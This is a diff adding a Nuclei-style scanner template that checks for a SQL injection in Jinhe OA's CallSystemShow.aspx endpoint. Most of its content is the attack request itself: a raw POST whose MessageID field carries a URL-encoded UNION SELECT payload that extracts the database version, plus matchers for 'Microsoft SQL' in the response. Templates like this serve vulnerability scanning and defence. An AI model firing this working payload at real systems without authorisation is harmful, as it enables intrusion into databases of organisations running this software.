@@ -1,0 +1,25 @@
+id: jinheOA-CallSystemShow_aspx-sqli
+
+info:
+  name: 金和OA CallSystemShow.aspx SQL注入漏洞
+  author: jinheOA
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        MessageID=%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION%2CNULL--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+      - type: status
+        status: 
+          - 200
